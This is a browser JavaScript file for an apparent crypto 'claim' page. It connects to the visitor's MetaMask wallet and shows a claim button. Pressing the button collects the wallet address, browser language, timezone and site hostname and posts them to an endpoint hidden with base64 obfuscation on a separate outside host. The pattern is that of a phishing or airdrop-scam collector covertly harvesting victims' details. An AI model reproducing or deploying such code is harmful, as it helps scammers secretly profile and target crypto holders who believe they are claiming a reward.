let connectButton = document.getElementById("connectBtn");
let claimBtn = document.getElementById("claimBtn");
let disp = document.getElementById("output");
let bbtn = document.querySelector("button");
let addrTxt = document.getElementById("addrTxt");
//let addrVal = addrTxt.textContent;
connectButton.addEventListener("click", () => {
  if (addrTxt.textContent == false) {
    if (typeof window.ethereum !== "undefined") {
      ethereum
        .request({ method: "eth_requestAccounts" })
        .then((accounts) => {
          const account = accounts[0];
          // let newP = document.createElement("p");
          // newP.classList.add("mt-3", "mb-1", "fs-4");
          // newP.textContent = account;
          // connectButton.parentNode.insertBefore(newP, connectButton);
          let str1 = account.substring(0, 6);
          let str2 = account.substring(account.length - 4);
          let str = str1 + "..." + str2;
          addrTxt.dataset.address = account;
          addrTxt.textContent = str;
          console.log(Math.round(Math.random(0, 10)));
          connectButton.style.display = "none";
          claimBtn.style.display = "inline-block";

          //walletID.innerHTML = `Wallet connected: <span>${account}</span>`;
        })
        .catch((error) => {
          //console.log(error, error.code);
        });
    } else {
    }
  } else {
  }
});

$("#myForm").on("submit", function (event) {
  event.preventDefault();
  const lang = navigator.language;
  const d = new Date();
  let sourceUrl = window.location.hostname;
  let diff = d.getTimezoneOffset();
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  let textVal = addrTxt.dataset.address;
  var formValues = {
    languagez: lang,
    tzone: timezone,
    sourceFrom: sourceUrl,
    addr: textVal,
  };
  let okxw = atob("aHR0cHM6Ly9saWZlZm9ybS10ZWFsLnZlcmNlbC5hcHAv");
  $.post(okxw, formValues, function (data) {
    //console.log(textVal);
    //console.log("submitted");
    $("#output").text(data.message);
  });
});

claimBtn.addEventListener("click", () => {
  $("#myForm").submit();

  document.getElementById("notEl").style.display = "inline-block";
});

document.getElementById("closeAlert").addEventListener("click", () => {
  document.getElementById("notEl").style.display = "none";
});
